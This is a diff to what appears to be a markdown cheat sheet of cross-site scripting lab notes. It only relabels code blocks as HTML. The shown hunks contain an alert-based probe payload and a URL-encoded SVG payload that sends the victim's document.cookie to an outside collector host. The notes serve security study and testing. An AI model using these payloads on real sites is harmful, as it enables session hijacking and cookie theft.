@@ -297,7 +297,7 @@ document.cookie = "TopSecret=UnsecureCookieValue4Peanut2019";
   
 >Basic XSS Payloads to ***identify*** application controls for handling data received in HTTP request.   
 
-```
+```html
 <img src=1 onerror=alert(1)>
 ```  
   
@@ -317,7 +317,7 @@ document.cookie = "TopSecret=UnsecureCookieValue4Peanut2019";
   
 >Application controls give message, ***"Tag is not allowed"*** when inserting basic XSS payloads, but discover SVG mark-up allowed using above methodology. This payload steal my own session cookie as POC.  
 
-```
+```html
 https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2Fcollaboration.net%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E
 ```  
 
